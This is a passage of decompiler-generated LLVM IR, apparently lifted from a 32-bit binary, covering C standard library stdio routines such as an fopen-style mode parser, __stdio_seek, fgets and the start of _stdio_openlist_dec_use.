  %v4_80574bf = ptrtoint i8* %arg2 to i32
  store i32 %v4_80574bf, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_80574cf = load i8, i8* %arg2, align 1
  %v3_80574cf = zext i8 %v2_80574cf to i32
  %v4_80574cf = load i32, i32* @eax, align 4
  %v5_80574cf = and i32 %v4_80574cf, -256
  %v6_80574cf = or i32 %v5_80574cf, %v3_80574cf
  store i32 %v6_80574cf, i32* %eax.global-to-local, align 4
  %v10_80574d1 = icmp eq i8 %v2_80574cf, 114
  br i1 %v10_80574d1, label %dec_label_pc_8057513, label %dec_label_pc_80574d5

dec_label_pc_80574d5:                             ; preds = %entry
  %v10_80574d5 = icmp eq i8 %v2_80574cf, 119
  store i32 577, i32* @ebx, align 4
  br i1 %v10_80574d5, label %dec_label_pc_8057515, label %dec_label_pc_80574de

dec_label_pc_80574de:                             ; preds = %dec_label_pc_80574d5
  %v10_80574de = icmp eq i8 %v2_80574cf, 97
  store i32 1089, i32* @ebx, align 4
  br i1 %v10_80574de, label %dec_label_pc_8057515, label %dec_label_pc_80574e6

dec_label_pc_80574e6:                             ; preds = %dec_label_pc_805758e, %dec_label_pc_8057568, %dec_label_pc_80574de
  %v0_80574e6 = load i32, i32* %stack_var_-16, align 4
  %v1_80574e6 = call i32 @__errno_location(i32 %v0_80574e6)
  store i32 %v1_80574e6, i32* %eax.global-to-local, align 4
  %v0_80574eb = load i32, i32* @ebp, align 4
  %v1_80574eb = icmp eq i32 %v0_80574eb, 0
  %v1_80574ed = inttoptr i32 %v1_80574e6 to i32*
  store i32 22, i32* %v1_80574ed, align 4
  br i1 %v1_80574eb, label %dec_label_pc_80576ef, label %dec_label_pc_80574f9

dec_label_pc_80574f9:                             ; preds = %dec_label_pc_80575b1, %dec_label_pc_80574e6
  %v0_80574f9 = load i32, i32* @ebp, align 4
  %v1_80574f9 = add i32 %v0_80574f9, 1
  %v2_80574f9 = inttoptr i32 %v1_80574f9 to i8*
  %v3_80574f9 = load i8, i8* %v2_80574f9, align 1
  %v4_80574f9 = and i8 %v3_80574f9, 32
  %v5_80574f9 = icmp eq i8 %v4_80574f9, 0
  br i1 %v5_80574f9, label %dec_label_pc_80576ef, label %dec_label_pc_8057503

dec_label_pc_8057503:                             ; preds = %dec_label_pc_80574f9
  store i32 %v0_80574f9, i32* %stack_var_-76, align 4
  store i32 0, i32* @ebp, align 4
  %v1_8057509 = call i32 @free(i32 %v0_80574f9)
  br label %dec_label_pc_80576ea

dec_label_pc_8057513:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8057515

dec_label_pc_8057515:                             ; preds = %dec_label_pc_80574de, %dec_label_pc_80574d5, %dec_label_pc_8057513
  %v0_8057526 = phi i32 [ 1089, %dec_label_pc_80574de ], [ 577, %dec_label_pc_80574d5 ], [ 0, %dec_label_pc_8057513 ]
  %v1_8057515 = add i32 %v4_80574bf, 1
  %v2_8057515 = inttoptr i32 %v1_8057515 to i8*
  %v3_8057515 = load i8, i8* %v2_8057515, align 1
  %v12_8057515 = icmp eq i8 %v3_8057515, 98
  %v1_8057515.v4_80574bf = select i1 %v12_8057515, i32 %v1_8057515, i32 %v4_80574bf
  store i32 %v1_8057515.v4_80574bf, i32* %eax.global-to-local, align 4
  %v1_8057520 = add i32 %v1_8057515.v4_80574bf, 1
  %v2_8057520 = inttoptr i32 %v1_8057520 to i8*
  %v3_8057520 = load i8, i8* %v2_8057520, align 1
  %v12_8057520 = icmp eq i8 %v3_8057520, 43
  %v1_8057524 = icmp eq i1 %v12_8057520, false
  br i1 %v1_8057524, label %dec_label_pc_805752e, label %dec_label_pc_8057526

dec_label_pc_8057526:                             ; preds = %dec_label_pc_8057515
  %v1_8057528 = or i32 %v0_8057526, 1
  store i32 %v1_8057528, i32* %eax.global-to-local, align 4
  %v1_805752b = add nuw nsw i32 %v1_8057528, 1
  store i32 %v1_805752b, i32* @ebx, align 4
  br label %dec_label_pc_805752e

dec_label_pc_805752e:                             ; preds = %dec_label_pc_8057515, %dec_label_pc_8057526
  %v0_80575b17 = phi i32 [ %v0_8057526, %dec_label_pc_8057515 ], [ %v1_805752b, %dec_label_pc_8057526 ]
  %v1_805752e = icmp eq i32 %arg3, 0
  %v1_8057530 = icmp eq i1 %v1_805752e, false
  br i1 %v1_8057530, label %dec_label_pc_8057564, label %dec_label_pc_8057532

dec_label_pc_8057532:                             ; preds = %dec_label_pc_805752e
  store i32 80, i32* %stack_var_-76, align 4
  %v1_8057537 = call i32 @malloc(i32 80)
  store i32 %v1_8057537, i32* %eax.global-to-local, align 4
  %v2_805753f = icmp eq i32 %v1_8057537, 0
  store i32 %v1_8057537, i32* @ebp, align 4
  br i1 %v2_805753f, label %dec_label_pc_80576f1, label %dec_label_pc_8057549

dec_label_pc_8057549:                             ; preds = %dec_label_pc_8057532
  %v2_8057537 = inttoptr i32 %v1_8057537 to i16*
  store i16 8192, i16* %v2_8057537, align 2
  %v2_8057551 = add i32 %v1_8057537, 8
  %v3_8057551 = inttoptr i32 %v2_8057551 to i32*
  store i32 0, i32* %v3_8057551, align 4
  %v2_8057558 = add i32 %v1_8057537, 56
  store i32 %v2_8057558, i32* %eax.global-to-local, align 4
  store i32 %v2_8057558, i32* %stack_var_-76, align 4
  %v1_805755c = call i32 @__stdio_init_mutex(i32 %v2_8057558)
  store i32 %v1_805755c, i32* %eax.global-to-local, align 4
  %v0_80575b1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8057564

dec_label_pc_8057564:                             ; preds = %dec_label_pc_805752e, %dec_label_pc_8057549
  %v2_80575b7 = phi i32 [ %v0_80575b17, %dec_label_pc_805752e ], [ %v0_80575b1.pre, %dec_label_pc_8057549 ]
  %v2_8057564 = icmp slt i32 %arg4, 0
  br i1 %v2_8057564, label %dec_label_pc_80575b1, label %dec_label_pc_8057568

dec_label_pc_8057568:                             ; preds = %dec_label_pc_8057564
  %v1_805756a = and i32 %v2_80575b7, 32771
  %v1_8057570 = add nuw nsw i32 %v1_805756a, 1
  store i32 %v1_8057570, i32* @edx, align 4
  %v0_8057571 = load i32, i32* @esi, align 4
  %v1_8057571 = add i32 %v0_8057571, 1
  %v2_8057574 = and i32 %v1_8057571, %v1_8057570
  store i32 %v2_8057574, i32* %eax.global-to-local, align 4
  %v12_8057576 = icmp eq i32 %v2_8057574, %v1_8057570
  %v1_8057578 = load i32, i32* @ebp, align 4
  %v2_8057578 = add i32 %v1_8057578, 4
  %v3_8057578 = inttoptr i32 %v2_8057578 to i32*
  store i32 %arg4, i32* %v3_8057578, align 4
  %v1_805757b = icmp eq i1 %v12_8057576, false
  br i1 %v1_805757b, label %dec_label_pc_80574e6, label %dec_label_pc_8057581

dec_label_pc_8057581:                             ; preds = %dec_label_pc_8057568
  %v0_8057581 = load i32, i32* @esi, align 4
  %v1_8057583 = and i32 %v0_8057581, 1024
  %v1_8057585 = xor i32 %v1_8057583, 1024
  store i32 %v1_8057585, i32* %eax.global-to-local, align 4
  %v1_805758a = load i32, i32* @ebx, align 4
  %v2_805758a = and i32 %v1_805758a, %v1_8057585
  %v3_805758a = icmp eq i32 %v2_805758a, 0
  br i1 %v3_805758a, label %dec_label_pc_8057581.dec_label_pc_80575a7_crit_edge, label %dec_label_pc_805758e

dec_label_pc_8057581.dec_label_pc_80575a7_crit_edge: ; preds = %dec_label_pc_8057581
  br label %dec_label_pc_80575a7

dec_label_pc_805758e:                             ; preds = %dec_label_pc_8057581
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_8057597 = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_8057597, i32* %eax.global-to-local, align 4
  %v1_805759f = icmp eq i32 %v3_8057597, 0
  %v1_80575a1 = icmp eq i1 %v1_805759f, false
  br i1 %v1_80575a1, label %dec_label_pc_80574e6, label %dec_label_pc_805758e.dec_label_pc_80575a7_crit_edge

dec_label_pc_805758e.dec_label_pc_80575a7_crit_edge: ; preds = %dec_label_pc_805758e
  %v0_80575a7.pre = load i32, i32* @esi, align 4
  %v0_80575ad.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80575a7

dec_label_pc_80575a7:                             ; preds = %dec_label_pc_8057581.dec_label_pc_80575a7_crit_edge, %dec_label_pc_805758e.dec_label_pc_80575a7_crit_edge
  %v0_80575ad = phi i32 [ %v1_805758a, %dec_label_pc_8057581.dec_label_pc_80575a7_crit_edge ], [ %v0_80575ad.pre, %dec_label_pc_805758e.dec_label_pc_80575a7_crit_edge ]
  %v0_80575a7 = phi i32 [ %v0_8057581, %dec_label_pc_8057581.dec_label_pc_80575a7_crit_edge ], [ %v0_80575a7.pre, %dec_label_pc_805758e.dec_label_pc_80575a7_crit_edge ]
  %v1_80575a7 = and i32 %v0_80575a7, 32768
  %v2_80575ad = or i32 %v1_80575a7, %v0_80575ad
  store i32 %v2_80575ad, i32* @ebx, align 4
  br label %dec_label_pc_80575d5

dec_label_pc_80575b1:                             ; preds = %dec_label_pc_8057564
  %v11_80575b3 = or i32 %v2_80575b7, 32768
  store i32 %v11_80575b3, i32* %eax.global-to-local, align 4
  %v1_80575b6 = add i32 %arg4, 1
  %v8_80575b6 = icmp eq i32 %v1_80575b6, 0
  store i32 %v1_80575b6, i32* @edi, align 4
  %v1_80575b7 = icmp eq i1 %v8_80575b6, false
  %v4_80575b7 = select i1 %v1_80575b7, i32 %v11_80575b3, i32 %v2_80575b7
  store i32 %v4_80575b7, i32* @ebx, align 4
  %v0_80575c1 = load i32, i32* @esi, align 4
  store i32 %v0_80575c1, i32* %stack_var_-76, align 4
  %v3_80575c2 = inttoptr i32 %v0_80575c1 to i8*
  %v4_80575c2 = call i32 @__libc_open(i8* %v3_80575c2, i32 %v4_80575b7)
  store i32 %v4_80575c2, i32* %eax.global-to-local, align 4
  %v2_80575ca = icmp slt i32 %v4_80575c2, 0
  %v1_80575cc = load i32, i32* @ebp, align 4
  %v2_80575cc = add i32 %v1_80575cc, 4
  %v3_80575cc = inttoptr i32 %v2_80575cc to i32*
  store i32 %v4_80575c2, i32* %v3_80575cc, align 4
  br i1 %v2_80575ca, label %dec_label_pc_80574f9, label %dec_label_pc_80575d5

dec_label_pc_80575d5:                             ; preds = %dec_label_pc_80575b1, %dec_label_pc_80575a7
  %v0_80575d5 = load i32, i32* @ebp, align 4
  %v1_80575d5 = inttoptr i32 %v0_80575d5 to i32*
  %v2_80575d5 = load i32, i32* %v1_80575d5, align 4
  %v2_80575d5.tr = trunc i32 %v2_80575d5 to i16
  %v1_80575dd = and i16 %v2_80575d5.tr, 8192
  %v3_80575dd = inttoptr i32 %v0_80575d5 to i16*
  store i16 %v1_80575dd, i16* %v3_80575dd, align 2
  %v0_80575e1 = load i32, i32* @ebx, align 4
  store i32 %v0_80575e1, i32* %eax.global-to-local, align 4
  %v1_80575e3 = and i32 %v0_80575e1, -31744
  %v0_80575e9 = load i32, i32* @ebp, align 4
  %v1_80575e9 = inttoptr i32 %v0_80575e9 to i32*
  %v2_80575e9 = load i32, i32* %v1_80575e9, align 4
  %v1_80575ec = mul i32 %v0_80575e1, 16
  %v1_80575ef = and i32 %v1_80575ec, 48
  %v1_80575f0 = add nuw nsw i32 %v1_80575ef, 16
  %v2_80575f3 = xor i32 %v1_80575f0, 48
  %v2_80575f6 = or i32 %v2_80575e9, %v1_80575e3
  %v2_80575f8 = or i32 %v2_80575f6, %v2_80575f3
  store i32 %v2_80575f8, i32* %eax.global-to-local, align 4
  %v1_80575fa = trunc i32 %v2_80575f8 to i16
  %v3_80575fa = inttoptr i32 %v0_80575e9 to i16*
  store i16 %v1_80575fa, i16* %v3_80575fa, align 2
  %v0_80575fe = load i32, i32* %stack_var_-76, align 4
  %v1_80575fe = call i32 @__errno_location(i32 %v0_80575fe)
  store i32 %v1_80575fe, i32* %eax.global-to-local, align 4
  %v0_8057606 = load i32, i32* @ebp, align 4
  %v1_8057606 = inttoptr i32 %v0_8057606 to i16*
  %v2_8057606 = load i16, i16* %v1_8057606, align 2
  %v3_8057606 = zext i16 %v2_8057606 to i32
  store i32 %v3_8057606, i32* @ebx, align 4
  %v1_805760a = inttoptr i32 %v1_80575fe to i32*
  %v2_805760a = load i32, i32* %v1_805760a, align 4
  store i32 %v2_805760a, i32* @edi, align 4
  store i32 %v1_80575fe, i32* @esi, align 4
  %v1_805760e = add i32 %v0_8057606, 4
  %v2_805760e = inttoptr i32 %v1_805760e to i32*
  %v3_805760e = load i32, i32* %v2_805760e, align 4
  store i32 %v3_805760e, i32* %stack_var_-76, align 4
  %v1_8057611 = call i32 @isatty(i32 %v3_805760e)
  %v2_8057619 = mul i32 %v1_8057611, 256
  store i32 %v2_8057619, i32* %eax.global-to-local, align 4
  %v0_805761c = load i32, i32* @ebx, align 4
  %v2_805761c = or i32 %v0_805761c, %v2_8057619
  store i32 %v2_805761c, i32* @ebx, align 4
  %v1_805761e = trunc i32 %v2_805761c to i16
  %v2_805761e = load i32, i32* @ebp, align 4
  %v3_805761e = inttoptr i32 %v2_805761e to i16*
  store i16 %v1_805761e, i16* %v3_805761e, align 2
  %v0_8057622 = load i32, i32* @edi, align 4
  %v1_8057622 = load i32, i32* @esi, align 4
  %v2_8057622 = inttoptr i32 %v1_8057622 to i32*
  store i32 %v0_8057622, i32* %v2_8057622, align 4
  %v0_8057624 = load i32, i32* @ebp, align 4
  %v1_8057624 = add i32 %v0_8057624, 8
  %v2_8057624 = inttoptr i32 %v1_8057624 to i32*
  %v3_8057624 = load i32, i32* %v2_8057624, align 4
  %v4_8057624 = icmp eq i32 %v3_8057624, 0
  %v1_8057628 = icmp eq i1 %v4_8057624, false
  br i1 %v1_8057628, label %dec_label_pc_805765c, label %dec_label_pc_805762a

dec_label_pc_805762a:                             ; preds = %dec_label_pc_80575d5
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_8057632 = call i32 @malloc(i32 4096)
  store i32 %v1_8057632, i32* %eax.global-to-local, align 4
  %v1_805763a = icmp eq i32 %v1_8057632, 0
  %v1_805763c = load i32, i32* @ebp, align 4
  %v2_805763c = add i32 %v1_805763c, 8
  %v3_805763c = inttoptr i32 %v2_805763c to i32*
  store i32 %v1_8057632, i32* %v3_805763c, align 4
  br i1 %v1_805763a, label %dec_label_pc_8057655, label %dec_label_pc_8057641

dec_label_pc_8057641:                             ; preds = %dec_label_pc_805762a
  %v1_8057641 = add i32 %v1_8057632, 4096
  store i32 %v1_8057641, i32* %eax.global-to-local, align 4
  %v1_8057646 = load i32, i32* @ebp, align 4
  %v2_8057646 = add i32 %v1_8057646, 12
  %v3_8057646 = inttoptr i32 %v2_8057646 to i32*
  store i32 %v1_8057641, i32* %v3_8057646, align 4
  %v0_8057649 = load i32, i32* @ebp, align 4
  %v1_8057649 = inttoptr i32 %v0_8057649 to i32*
  %v2_8057649 = load i32, i32* %v1_8057649, align 4
  %v1_805764c = udiv i32 %v2_8057649, 256
  %v3_805764c = and i32 %v1_805764c, 191
  %v8_805764c = or i32 %v3_805764c, 64
  %v10_805764c = mul nuw nsw i32 %v8_805764c, 256
  %v11_805764c = and i32 %v2_8057649, -65281
  %v12_805764c = or i32 %v10_805764c, %v11_805764c
  store i32 %v12_805764c, i32* %eax.global-to-local, align 4
  %v1_805764f = trunc i32 %v12_805764c to i16
  %v3_805764f = inttoptr i32 %v0_8057649 to i16*
  store i16 %v1_805764f, i16* %v3_805764f, align 2
  br label %dec_label_pc_805765c

dec_label_pc_8057655:                             ; preds = %dec_label_pc_805762a
  %v0_8057655 = load i32, i32* @ebp, align 4
  %v1_8057655 = add i32 %v0_8057655, 12
  %v2_8057655 = inttoptr i32 %v1_8057655 to i32*
  store i32 0, i32* %v2_8057655, align 4
  br label %dec_label_pc_805765c

dec_label_pc_805765c:                             ; preds = %dec_label_pc_80575d5, %dec_label_pc_8057641, %dec_label_pc_8057655
  %v0_805765c = load i32, i32* @ebp, align 4
  %v1_805765c = add i32 %v0_805765c, 8
  %v2_805765c = inttoptr i32 %v1_805765c to i32*
  %v3_805765c = load i32, i32* %v2_805765c, align 4
  store i32 %v3_805765c, i32* %eax.global-to-local, align 4
  %v1_805765f = add i32 %v0_805765c, 2
  %v2_805765f = inttoptr i32 %v1_805765f to i8*
  store i8 0, i8* %v2_805765f, align 1
  %v0_8057663 = load i32, i32* @ebp, align 4
  %v1_8057663 = add i32 %v0_8057663, 44
  %v2_8057663 = inttoptr i32 %v1_8057663 to i32*
  store i32 0, i32* %v2_8057663, align 4
  %v0_805766a = load i32, i32* @ebp, align 4
  %v1_805766a = add i32 %v0_805766a, 1
  %v2_805766a = inttoptr i32 %v1_805766a to i8*
  %v3_805766a = load i8, i8* %v2_805766a, align 1
  %v4_805766a = and i8 %v3_805766a, 32
  %v5_805766a = icmp eq i8 %v4_805766a, 0
  %v0_805766e = load i32, i32* %eax.global-to-local, align 4
  %v2_805766e = add i32 %v0_805766a, 24
  %v3_805766e = inttoptr i32 %v2_805766e to i32*
  store i32 %v0_805766e, i32* %v3_805766e, align 4
  %v0_8057671 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057671 = load i32, i32* @ebp, align 4
  %v2_8057671 = add i32 %v1_8057671, 28
  %v3_8057671 = inttoptr i32 %v2_8057671 to i32*
  store i32 %v0_8057671, i32* %v3_8057671, align 4
  %v0_8057674 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057674 = load i32, i32* @ebp, align 4
  %v2_8057674 = add i32 %v1_8057674, 16
  %v3_8057674 = inttoptr i32 %v2_8057674 to i32*
  store i32 %v0_8057674, i32* %v3_8057674, align 4
  %v0_8057677 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057677 = load i32, i32* @ebp, align 4
  %v2_8057677 = add i32 %v1_8057677, 20
  %v3_8057677 = inttoptr i32 %v2_8057677 to i32*
  store i32 %v0_8057677, i32* %v3_8057677, align 4
  %v0_805767a = load i32, i32* @global_var_805e23c.595, align 4
  store i32 %v0_805767a, i32* @eax, align 4
  %v1_805767f = load i32, i32* @ebp, align 4
  %v2_805767f = add i32 %v1_805767f, 52
  %v3_805767f = inttoptr i32 %v2_805767f to i32*
  store i32 %v0_805767a, i32* %v3_805767f, align 4
  br i1 %v5_805766a, label %dec_label_pc_80576f1, label %dec_label_pc_8057684

dec_label_pc_8057684:                             ; preds = %dec_label_pc_805765c
  %v2_805768f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805768f, i32* %stack_var_-76, align 4
  %v2_8057694 = call i32 @__pthread_return_void(i32 %v2_805768f, i32 134567263)
  store i32 %v2_8057694, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805e224.487 to i32), i32* %stack_var_-76, align 4
  %v1_80576a0 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805e224.487 to i32))
  store i32 %v1_80576a0, i32* @eax, align 4
  %v2_80576b2 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_80576b2, i32* %stack_var_-76, align 4
  %v2_80576b7 = call i32 @__pthread_return_void(i32 %v2_80576b2, i32 134567263)
  store i32 %v2_80576b7, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805e20c.486 to i32), i32* %stack_var_-76, align 4
  %v1_80576c3 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805e20c.486 to i32))
  %v0_80576c8 = load i32, i32* bitcast (i32** @global_var_805e208.488 to i32*), align 8
  store i32 %v0_80576c8, i32* @eax, align 4
  %v1_80576cd = load i32, i32* @ebp, align 4
  %v2_80576cd = add i32 %v1_80576cd, 32
  %v3_80576cd = inttoptr i32 %v2_80576cd to i32*
  store i32 %v0_80576c8, i32* %v3_80576cd, align 4
  %v2_80576d0 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_80576d0, i32* @ecx, align 4
  %v0_80576d1 = load i32, i32* @ebp, align 4
  store i32 %v0_80576d1, i32* bitcast (i32** @global_var_805e208.488 to i32*), align 8
  store i32 %v2_80576b2, i32* %stack_var_-76, align 4
  %v2_80576db = call i32 @__pthread_return_void(i32 %v2_80576b2, i32 1)
  store i32 %v2_80576b2, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_805768f, i32* %stack_var_-76, align 4
  %v2_80576e5 = call i32 @__pthread_return_void(i32 %v2_805768f, i32 1)
  br label %dec_label_pc_80576ea

dec_label_pc_80576ea:                             ; preds = %dec_label_pc_8057503, %dec_label_pc_8057684
  %storemerge = phi i32 [ %v2_80576e5, %dec_label_pc_8057684 ], [ %v1_8057509, %dec_label_pc_8057503 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80576f1

dec_label_pc_80576ef:                             ; preds = %dec_label_pc_80574f9, %dec_label_pc_80574e6
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_80576f1

dec_label_pc_80576f1:                             ; preds = %dec_label_pc_805765c, %dec_label_pc_8057532, %dec_label_pc_80576ea, %dec_label_pc_80576ef
  %v0_80576f4 = load i32, i32* @ebp, align 4
  store i32 %v0_80576f4, i32* %eax.global-to-local, align 4
  %v2_80576f6 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80576f6, i32* @ebx, align 4
  store i32 %v0_80574ba, i32* @esi, align 4
  store i32 %v0_80574b9, i32* @edi, align 4
  store i32 %v0_80574b8, i32* @ebp, align 4
  ret i32 %v0_80576f4

; uselistorder directives
  uselistorder i32 %v2_80576b2, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_805768f, { 1, 0, 3, 2 }
  uselistorder i32 %v2_8057649, { 1, 0 }
  uselistorder i32 %v1_8057632, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8057619, { 1, 0 }
  uselistorder i32 %v1_80575fe, { 1, 0, 2 }
  uselistorder i32 %v11_80575b3, { 1, 0 }
  uselistorder i32 %v1_8057585, { 1, 0 }
  uselistorder i32 %v0_8057581, { 1, 0 }
  uselistorder i32 %v2_80575b7, { 1, 0, 2 }
  uselistorder i32 %v1_8057537, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0, 26, 27 }
  uselistorder i32 191, { 0, 2, 1 }
  uselistorder i32 4096, { 20, 9, 18, 4, 21, 5, 6, 22, 7, 19, 10, 12, 11, 1, 13, 15, 14, 2, 17, 16, 3, 0, 8 }
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 1, 5, 0, 2, 3, 4 }
  uselistorder i32 32768, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 1, 0, 9, 8, 7, 6, 13, 12, 11, 10, 5, 4, 3, 2 }
  uselistorder i32 1024, { 4, 2, 3, 0, 24, 5, 7, 6, 25, 9, 8, 1, 10, 11, 18, 19, 20, 21, 12, 22, 23, 14, 15, 16, 13, 17 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 3, 2, 1, 0, 4 }
  uselistorder i8 43, { 0, 2, 1 }
  uselistorder i32 22, { 8, 9, 14, 3, 4, 5, 6, 7, 13, 12, 10, 11, 15, 1, 2, 0 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i32 %arg4, { 4, 3, 2, 0, 1, 5 }
  uselistorder label %dec_label_pc_80576f1, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_80576ea, { 1, 0 }
  uselistorder label %dec_label_pc_805765c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80575a7, { 1, 0 }
  uselistorder label %dec_label_pc_8057564, { 1, 0 }
  uselistorder label %dec_label_pc_805752e, { 1, 0 }
  uselistorder label %dec_label_pc_8057515, { 2, 0, 1 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_8057708 = add i32 %tmp5, 4
  %v2_8057708 = inttoptr i32 %v1_8057708 to i32*
  %v3_8057708 = load i32, i32* %v2_8057708, align 4
  %v2_805770b = load i32, i32* %arg2, align 4
  %v1_8057711 = add i32 %arg1, 4
  %v2_8057711 = inttoptr i32 %v1_8057711 to i32*
  %v3_8057711 = load i32, i32* %v2_8057711, align 4
  %v4_8057714 = call i32 @__libc_lseek64(i32 %v3_8057711, i32 %v2_805770b, i32 %v3_8057708, i32 %arg3)
  %v0_805771c = load i32, i32* @edx, align 4
  %v2_805771c = icmp slt i32 %v0_805771c, 0
  store i32 %v4_8057714, i32* %ecx.global-to-local, align 4
  br i1 %v2_805771c, label %dec_label_pc_8057729, label %dec_label_pc_8057722

dec_label_pc_8057722:                             ; preds = %entry
  %v1_8057722 = load i32, i32* @ebx, align 4
  %v2_8057722 = inttoptr i32 %v1_8057722 to i32*
  store i32 %v4_8057714, i32* %v2_8057722, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_8057726 = load i32, i32* @edx, align 4
  %v1_8057726 = load i32, i32* @ebx, align 4
  %v2_8057726 = add i32 %v1_8057726, 4
  %v3_8057726 = inttoptr i32 %v2_8057726 to i32*
  store i32 %v0_8057726, i32* %v3_8057726, align 4
  %v0_805772a.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8057729

dec_label_pc_8057729:                             ; preds = %entry, %dec_label_pc_8057722
  %v0_805772a = phi i32 [ %v4_8057714, %entry ], [ %v0_805772a.pre, %dec_label_pc_8057722 ]
  ret i32 %v0_805772a

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_8057729, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8057730 = load i32, i32* @edi, align 4
  %v0_8057731 = load i32, i32* @esi, align 4
  %v0_8057732 = load i32, i32* @ebx, align 4
  %v12_8057733 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_805773a = add i32 %arg3, 52
  %v2_805773a = inttoptr i32 %v1_805773a to i32*
  %v3_805773a = load i32, i32* %v2_805773a, align 4
  store i32 %v3_805773a, i32* @edi, align 4
  %v1_805773d = icmp eq i32 %v3_805773a, 0
  %v1_805773f = icmp eq i1 %v1_805773d, false
  br i1 %v1_805773f, label %entry.dec_label_pc_8057760_crit_edge, label %dec_label_pc_8057741

entry.dec_label_pc_8057760_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8057760

dec_label_pc_8057741:                             ; preds = %entry
  %v1_8057741 = add i32 %arg3, 56
  store i32 %v1_8057741, i32* @ebx, align 4
  store i32 %v12_8057733, i32* @eax, align 4
  %v2_8057750 = call i32 @__pthread_return_void(i32 %v12_8057733, i32 134567263)
  %v0_8057755 = load i32, i32* @ebx, align 4
  %v1_8057758 = call i32 @__pthread_return_0(i32 %v0_8057755)
  %v0_8057761.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8057760

dec_label_pc_8057760:                             ; preds = %entry.dec_label_pc_8057760_crit_edge, %dec_label_pc_8057741
  %v0_8057761 = phi i32 [ %arg3, %entry.dec_label_pc_8057760_crit_edge ], [ %v0_8057761.pre, %dec_label_pc_8057741 ]
  %v0_8057760 = load i32, i32* @edx, align 4
  %v4_805776a = inttoptr i32 %arg1 to i8*
  %v5_805776a = call i32 @__GI_fgets_unlocked(i8* %v4_805776a, i32 %arg2, i32 %v0_8057761, i32 %v0_8057760)
  store i32 %v5_805776a, i32* %ebx.global-to-local, align 4
  br i1 %v1_805773f, label %dec_label_pc_8057789, label %dec_label_pc_8057778

dec_label_pc_8057778:                             ; preds = %dec_label_pc_8057760
  store i32 %v12_8057733, i32* @eax, align 4
  %v2_8057781 = call i32 @__pthread_return_void(i32 %v12_8057733, i32 1)
  %v0_805778c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8057789

dec_label_pc_8057789:                             ; preds = %dec_label_pc_8057760, %dec_label_pc_8057778
  %v0_805778c = phi i32 [ %v5_805776a, %dec_label_pc_8057760 ], [ %v0_805778c.pre, %dec_label_pc_8057778 ]
  store i32 %v0_8057732, i32* @ebx, align 4
  store i32 %v0_8057731, i32* @esi, align 4
  store i32 %v0_8057730, i32* @edi, align 4
  ret i32 %v0_805778c

; uselistorder directives
  uselistorder i32 %v12_8057733, { 2, 3, 0, 1 }
  uselistorder i32 52, { 6, 7, 8, 9, 1, 10, 2, 3, 4, 5, 13, 14, 11, 12, 15, 0 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8057789, { 1, 0 }
  uselistorder label %dec_label_pc_8057760, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_80577a3 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80577a3, i32* @eax, align 4
  %v2_80577a8 = call i32 @__pthread_return_void(i32 %v2_80577a3, i32 134567263)
  %v1_80577b4 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805e224.487 to i32))
